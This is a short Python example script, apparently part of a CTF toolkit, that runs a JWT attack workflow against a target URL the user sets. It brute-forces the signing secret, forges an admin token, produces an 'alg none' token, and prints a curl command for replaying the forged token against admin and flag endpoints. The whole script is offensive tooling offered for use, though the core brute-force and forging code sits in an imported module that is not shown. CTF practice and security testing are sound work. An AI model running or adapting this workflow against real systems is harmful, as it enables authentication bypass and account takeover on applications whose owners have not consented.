#!/usr/bin/env python3
"""
Example: JWT-focused attack — grab token, brute secret, forge admin JWT.

Common in CTFs where login gives you a low-priv JWT and the flag is
behind an admin-only endpoint.
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import urllib3
urllib3.disable_warnings()

from ctf_toolkit.core import make_session, section
from ctf_toolkit.authtest import AuthTester

TARGET = "http://target.com"   # ← change this

# If you already have a JWT from login, pass it as auth-token:
# sess = make_session(token="eyJhbGci...")
sess = make_session()

section("JWT ATTACK WORKFLOW")
tester = AuthTester(TARGET, sess)
findings = tester.jwt()

# Findings will include:
#   ("JWT-secret", "the_secret_found")
#   ("JWT-forged", "eyJ...forged_admin_token...")
#   ("JWT-none-attack", "eyJ...alg_none_token...")

print("\n[*] Copy a forged token above and replay it against /admin, /flag, /dashboard")
print("[*] Example:")
print("    curl -H 'Authorization: Bearer <forged>' http://target.com/admin")
